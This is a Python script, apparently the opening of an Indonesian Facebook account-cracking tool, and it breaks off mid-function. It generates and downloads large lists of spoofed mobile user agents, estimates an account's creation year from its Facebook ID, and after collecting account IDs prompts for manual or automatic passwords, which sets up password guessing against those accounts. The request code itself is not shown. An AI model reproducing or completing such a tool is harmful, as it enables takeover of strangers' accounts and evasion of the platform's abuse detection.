###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
ses = requests.Session()
device = platform.platform()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ IMPORT FILE FROM DIRECTORY ]---------- ###
from src import login as Login
from src import dump as Dump
from src import lain as Lain

########

########

###----------[ COLOR FOR PRINT ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ COLOR FOR RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()
loop = 0
id,id2,ok,cp = [],[],[],[]
mtd_dev = []
pwx = []
tutu = []
apk = []
azxc = []
pwd_time = int(datetime.now().timestamp())
jembot=[]
mega=open("/sdcard/samsul.txt","r").read().splitlines()
###----------[ TIME ]---------- ###
now = datetime.now()
day = now.day
month = now.month
year = now.year
month_birthday = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
month_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if month < 0 or month > 12:
		exit()
	month_now = month - 1
except ValueError:exit()
_month_ = month_cek[month_now]
my_date = date.today()
day_now = calendar.day_name[my_date.weekday()]
date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))

try:
	sia1 = ses.get("https://raw.githubusercontent.com/fengzhizi715/user-agent-list/master/Safari.txt").text
	open('Safari.txt','w').write(sia1)
	gelo1 = open('Safari.txt','r').read().splitlines()
	sia = ses.get("https://raw.githubusercontent.com/qyu37/useragent/master/useragent.txt").text
	open('useragent.txt','w').write(sia)
	gelo = open('useragent.txt','r').read().splitlines()
except:pass
for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	uams = f"Mozilla/5.0 (Linux; Android {str(rr(4,9))}; vivo {str(rr(1000,1999))} Build/PKQ1.{str(rr(100000,599999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(59,109))}.0.{str(rr(1999,5999))}.{str(rr(59,99))} Mobile Safari/537.36 VivoBrowser/{str(rr(4,9))}.{str(rr(4,9))}.0.{str(rr(1,9))}"
	if uams in tutu:pass
	else:tutu.append(uams)
	uams1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,9))}.{str(rr(4,9))}; en-us; ASUS_T00F Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(10,19))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/{str(rr(1,9))}.{str(rr(1,9))}.1.{str(rr(199,599))}"
	if uams1 in tutu:pass
	else:tutu.append(uams1)
	uams2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,9))}.{str(rr(4,9))}.{str(rr(1,9))}; A{str(rr(3,9))}-{str(rc(aZ))}{str(rr(10,30))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))} Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(30,66))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,199))}.0.{str(rr(1999,5999))}.{str(rr(40,99))} Safari/537.36"
	if uams2 in tutu:pass
	else:tutu.append(uams2)
	uams3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,9))}.{str(rr(1,9))}.0; L1f-pluss) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(49,199))}.0.{str(rr(1999,5999))}.{str(rr(39,107))} Mobile Safari/537.36"
	if uams3 in tutu:pass
	else:tutu.append(uams3)
	uams4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,9))}.{str(rr(4,9))}.{str(rr(4,9))}; en-au; SAMSUNG SM-{str(rc(aZ))}{str(rr(99,999))}{str(rc(aZ))} Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(49,99))}{str(rc(aZ))}) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/{str(rr(39,199))}.0.{str(rr(1999,5999))}.{str(rr(59,99))} Mobile Safari/537.36"
	if uams4 in tutu:pass
	else:tutu.append(uams4)
	uams5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,9))}; CPH{str(rr(1000,1999))} Build/PPR1.{str(rr(100000,599999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1999,5999))}.{str(rr(10,99))} Mobile Safari/537.36"
	if uams5 in tutu:pass
	else:tutu.append(uams5)

for tu in range(10000):
        a = ''.join((random.choice('ABCDEFGHIJKLM1234567890NOPQRSTUVWXYS'))
for _ in range(6))
        b = random.randrange(73, 99)
        c = random.randrange(4200, 4900)
        d = random.randrange(40, 150)
        e = random.randrange(4,10)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g=random.randrange(1, 999)
        h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        user = f'''Mozilla/5.0 (Linux; Android 4.4.2; Sony Xperia Z3 Build/{a}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
        user1 = f'''Mozilla/5.0 (Linux; Android {e}; XIAOMI Redmi Note 9 Pro Build/{a}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
        user2 = f'''Mozilla/5.0 (Linux; Android {e}; HTC One M9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
        uacak=random.choice([user,user1,user2])
        jembot.append(uacak)
#---------[ USER AGENT JOS ]-----------#
ua_star  = (['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.0.3.2', 
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5', 
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX3263) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'Mozilla/5.0 (X11; 10; Linux x86_64)E219Y)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.082.0.4655.104Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]',
'Mozilla/5.0 (Linux; U; Android 11; en-in; Redmi Note 9 Pro Max Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.10.7-gn',
'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112;]',
'Mozilla/5.0 (Linux; Android 12; V2110 Build/SP1A.210812.003_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]',
'Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]', 
'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-B724L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4495.118 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-D636K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4391.69 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.11.4.2-gn',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36', 
'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1', 
'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1', 
'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1', 
'Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3', 
'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36'])
ua_star2 = ([
'Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 PHX/10.0',
'Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36 PHX/8.4',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7.0; en-us; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36 PHX/7.9',
'Mozilla/5.0 (Linux; U; Android 7.0; en-gb; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 PHX/8.2',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7.0; fr-fr; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 PHX/9.3',
'Mozilla/5.0 (Linux; Android 6.0; Infinix Zero 3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8.0.0; fr-fr; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36 PHX/8.3',
'Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.3.1204 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 OPX/1.0',
'Mozilla/5.0 (Linux; U; Android 8.0.0; ar-SA; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36 PHX/5.8',
'Mozilla/5.0 (Linux; U; Android 7.0; en-us; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36 PHX/5.7',
'Mozilla/5.0 (Linux; U; Android 7.0; en-us; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 PHX/7.2',
'Mozilla/5.0 (Linux; U; Android 7.0; en-us; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 PHX/6.9',
'Mozilla/5.0 (Linux; U; Android 7.0; en-ng; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 PHX/6.7',
'Mozilla/5.0 (Linux; Android 7.0; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 PHX/6.9',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7.0; en-gb; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36 PHX/6.7',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 OPT/2.7',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.3440.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 6.0; en-US; Infinix HOT 4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.2.1208 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
'Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36 PHX/5.5',
'Mozilla/5.0 (Linux; U; Android 7.0; ar-ma; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36 PHX/5.3',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.2.2461.137690',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 6.0; en-US; Infinix HOT 4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.6.1221 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; Infinix X510 Build/ AppleWebKit/534.30 (KHTML, like Gecko) Version/5.1 Mobile Safari/534.30;',
'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
])

###----------[ Tahun Pembuatan ]-------------##
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

###----------[ SETTING PASSWORD ]---------- ###
def setting_password(id):
	print("")
	prints(Panel(f"""{P2}succes collecting {len(id)} id""",width=80,padding=(0,23),style=f"{color_table}"))
	set = input(f" {N}do you want to use manual password?[y/n] : ")
	if set in["y","Y"]:
		manual(id)
	else:
		otomatis(id)
	
def aturutuan(id):
	urut = []
